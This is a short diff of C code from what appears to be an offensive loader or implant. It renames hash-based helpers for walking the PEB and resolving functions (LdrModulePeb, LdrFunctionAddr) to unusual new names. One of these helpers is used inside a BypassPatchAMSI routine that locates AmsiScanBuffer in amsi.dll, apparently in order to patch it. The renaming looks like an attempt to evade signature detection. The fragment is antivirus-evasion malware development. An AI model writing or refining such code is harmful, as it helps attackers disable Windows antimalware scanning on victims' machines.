@@ -62,7 +62,7 @@ ULONG HashEx(
  * @param Hash
  * @return
  */
-PVOID LdrModulePeb(
+PVOID LoaderModPebbb(
     IN DWORD Hash
 ) {
     PLDR_DATA_TABLE_ENTRY Ldr = NULL;
@@ -374,7 +374,7 @@ END:
  * @param FunctionHash
  * @return
  */
-PVOID LdrFunctionAddr(
+PVOID LoaderFuncAdd(
     IN PVOID Module,
     IN DWORD Hash
 ) {
@@ -955,7 +955,7 @@ BOOL BypassPatchAMSI(
 
     PRINTF( "[+] Loaded asmi.dll: %p\n", hModuleAmsi );
 
-    pAddress = LdrFunctionAddr( hModuleAmsi, H_FUNC_AMSISCANBUFFER );
+    pAddress = LoaderFuncAdd( hModuleAmsi, H_FUNC_AMSISCANBUFFER );
     if( pAddress == NULL )
         return 0;
 
